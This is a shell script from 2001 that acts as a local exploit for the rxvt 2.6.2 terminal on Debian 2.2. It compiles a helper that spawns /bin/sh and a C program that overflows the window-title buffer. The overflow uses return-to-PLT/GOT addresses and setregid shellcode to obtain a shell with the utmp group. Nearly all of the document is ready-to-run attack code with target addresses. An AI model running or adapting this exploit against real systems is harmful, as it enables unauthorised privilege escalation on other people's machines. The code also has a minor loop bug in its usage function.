#!/bin/sh

#
# MasterSecuritY <www.mastersecurity.fr>
#
# xrxvt.sh - Local exploit for xrxvt 2.6.2
# Copyright (C) 2001  Michel "MaXX" Kaempf <maxx@mastersecurity.fr>
# Copyright (C) 2001  Samuel "Zorgon" Dralet <samuel.dralet@mastersecurity.fr>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or (at
# your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

echo "rxvt-2.6.2 exploit for Linux Debian 2.2"
echo "Which target :"
echo -e "\t0. rxvt 2.6.2 (package deb) on Debian 2.2"
echo -e "\t1. rxvt 2.6.2 (tarball) on Debian 2.2"
echo
echo -n "target : "

read TARGET

cat > /tmp/xx.c <<EOF
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

int main()
{
        char * p_ttyname;
        char * argv[] = { "/bin/sh", NULL };

        p_ttyname = ttyname( STDERR_FILENO );
        if ( p_ttyname == NULL ) {
                return( -1 );
        }
        if ( open(p_ttyname, O_RDONLY) != STDIN_FILENO ) {
                return( -1 );
        }
        if ( open(p_ttyname, O_WRONLY) != STDOUT_FILENO ) {
                return( -1 );
        }

        execve( argv[0], argv, NULL );
        return( -1 );
}
EOF
gcc -o /tmp/xx /tmp/xx.c
rm -f /tmp/xx.c

cat > /tmp/xrxvt.c << EOF
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <X11/X.h>
#include <X11/Xlib.h>

#define BUF 256 /* buffer size */
#define EBP 4
#define EIP 4
#define ESC 3   /* alignment */

#define GID "\x2b"
#define DISPLAY ":0"
#define STACK ( 0xc0000000 - 4 )

Display *d;

char shellcode[] =
/* setregid( -1, GID ); */
"\x31\xdb\x31\xc9\xbb\xff\xff\xff\xff\xb1"GID"\x31\xc0\xb0\x47\xcd\x80"
/* setregid( GID, GID ); */
"\x31\xdb\x31\xc9\xb3"GID"\xb1"GID"\x31\xc0\xb0\x47\xcd\x80"
/* Aleph One ;) */
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/tmp/xx";

struct os
{
    int id;
    char *desc;
    char *path;
    unsigned long plt;
    unsigned long got;
};

struct os target[]=
{
    { 0, "rxvt 2.6.2 (package deb) on Debian 2.2", "/usr/X11R6/bin/rxvt-xterm",
      0x0804add0, 0x0805c964 },
    { 1, "rxvt 2.6.2 (tarball) on Debian 2.2", "/usr/local/bin/rxvt",
      0x0804a690, 0x08059e1c },
    { 2, NULL, 0, 0 }
};

void usage ( char *cmd )
{
    int i;
    fprintf(stderr, "rxvt-2.6.2 exploit for Linux Debian 2.2\n");
    fprintf(stderr, "usage: %s <target>\n",cmd);
    fprintf(stderr, "with target:\n\n");
    for( i < 0; i < sizeof(target) / sizeof(struct os); i++ )
        fprintf(stderr, "%d. %s\n", i, target[i].desc);

    exit( -1 );
}

int main(int argc, char *argv[])
{
    char buffer[ BUF - ESC + EBP + EIP + 12 + 1];
    char * exec_argv[] = { NULL, "-T", buffer, NULL };
    char * envp[] = { shellcode, NULL };
    int i, t;
    char *path;

    if ( argc != 2 )
        usage(argv[0]);

    t = atoi(argv[1]);
    if( t < 0 || t >= sizeof(target) / sizeof(struct os) )
        usage( argv[0] );

    path = (char *)malloc(strlen(target[t].path)+1);
    strcpy(path,target[t].path);

    if ( (d = XOpenDisplay(DISPLAY)) == NULL ){
        fprintf(stderr, "Unable to open display: %s\n", DISPLAY);
        exit(10);
    }

    for ( i = 0; i < BUF - ESC + EBP; i++ ) {
        buffer[ i ] = 'A';
    }

    *( (size_t *) &(buffer[i]) ) = target[t].plt;
    i += sizeof(size_t);
    *( (size_t *) &(buffer[i]) ) = target[t].got + 4;
    i += sizeof(size_t);
    *( (size_t *) &(buffer[i]) ) = target[t].got + 4;
    i += sizeof(size_t);
    *( (size_t *) &(buffer[i]) ) = STACK - (strlen(path) + 1) - sizeof(shellcode);
    i += sizeof(size_t);

    buffer[i] = '\0';

    exec_argv[0] = path;
    execve( exec_argv[0], exec_argv, envp );
    return( -1 );
}
EOF
gcc -o /tmp/xrxvt /tmp/xrxvt.c -lX11
rm -f /tmp/xrxvt.c

echo "Go to rxvt window and type 'echo -ne \"\033[21t\"' ..."
echo "And see ..."
/tmp/xrxvt $TARGET
